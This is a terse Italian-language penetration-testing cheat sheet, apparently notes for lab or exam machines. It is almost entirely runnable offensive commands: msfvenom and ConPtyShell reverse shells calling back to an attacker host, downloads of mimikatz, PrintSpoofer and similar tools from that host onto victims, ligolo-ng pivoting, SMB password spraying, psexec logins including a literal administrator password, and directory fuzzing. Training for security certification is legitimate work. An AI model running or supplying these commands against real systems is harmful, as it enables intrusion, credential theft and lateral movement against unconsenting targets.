# Reverse Shell

Link Utili:
- https://www.revshells.com/
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
## Windows

**msfvenom**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI_IP LPORT=6666 -f exe -o revshell.exe 
```

 **ConPtyShell** (Fully Interactive Reverse Shell) 

Su kali:

```bash
git clone https://github.com/antonioCoco/ConPtyShell.git

python -m http.server 9999

stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Su windows:

```bash
powershell iwr -uri http://$KALI_IP:9999/windows/ConPtyShell.exe

powershell C:\windows\temp\ConPtyShell.exe $KALI_IP 3001

powershell ConPtyShell.exe $KALI_IP 3001
```

# Linux Toolkit

Su kali:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240519-fab0d0d5/linpeas.sh

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Su linux:

```bash
wget http://$KALI_IP:9999/linux/linpeas.sh

wget http://$KALI_IP:9999/linux/pspy64
./pspy64 -pf -i 1000
```
# Windows Toolkit

Su kali:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240519-fab0d0d5/winPEASx64.exe

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe

wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1

wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1

wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
```

Su windows:

```bash
iwr -uri http://$KALI_IP:9999/windows/winPEASx64.exe -Outfile winPEAS.exe

iwr -uri http://$KALI_IP:9999/windows/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

iwr -uri http://$KALI_IP:9999/windows/SharpHound.ps1 -Outfile SharpHound.ps1

iwr -uri http://$KALI_IP:9999/windows/PowerView.ps1 -Outfile PowerView.ps1 

iwr -uri http://$KALI_IP:9999/windows/mimikatz.exe -Outfile mimikatz.exe
```

# Mimikatz

- https://book.hacktricks.xyz/v/it/windows-hardening/stealing-credentials/credentials-mimikatz

# Tunneling

**Ligolo-ng

Guida:
- https://kentosec.com/2022/01/13/pivoting-through-internal-networks-with-sshuttle-and-ligolo-ng/

Su kali

```bash
git clone https://github.com/nicocha30/ligolo-ng.git

cd /tmp/ligon-ng

sudo go build -o agent cmd/agent/main.go
sudo go build -o proxy cmd/proxy/main.go

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip

unzip ligolo-ng_agent_0.5.2_windows_amd64.zip

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add $SUBNET_TARGET/24 dev ligolo

sudo ./proxy -selfcert
```

Su linux:


Su windows:

```bash
iwr -uri http://$KALI_IP:9999/windows/ligolo-ng/agent.exe -Outfile agent.exe

./agent.exe -connect 192.168.45.195:11601 -ignore-cert
```

# File transfer

**scp**

Su kali:

```bash
sudo systemctl ssh start
```

Su windows:

```bash
scp path/to/file kali@$KALI_IP:path/to/file
```

# Find flags

```bash
Get-ChildItem -Path C:\users -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\users -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
```

# Windows Connection

**SMB**

```bash
smbclient -N -L //IP_TARGET/ -U domain.com/user%password
```

**SMB Password Spraying**

```bash
sudo crackmapexec smb $SUBNET_TARGET/24  -u users.txt -p passwords.txt -d medtech.com --continue-on-success

sudo crackmapexec smb $SUBNET_TARGET/24  -u users.txt -p passwords.txt -d medtech.com --continue-on-success | grep "[+]"
```

**RDP**

```bash
xfreerdp /cert-ignore /u:user /d:domain.com /p:"Password" /v:$IP_TARGET
```


**WinRM**

```basH
evil-winrm -i $IP_TARGET -u 'user' -p 'Password'
```

**impacket-psexec**

```basH
impacket-psexec domain.com/user:"password"@$IP

impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.165.21
```

## Directory Fuzzing

**ffuf**

```basH
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://$TARGET_IP/FUZZ

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -u http://$TARGET_IP/FUZZ

ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://$TARGET_IP/FUZZ
```

**gobuster**

```basH
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET_IP
```


`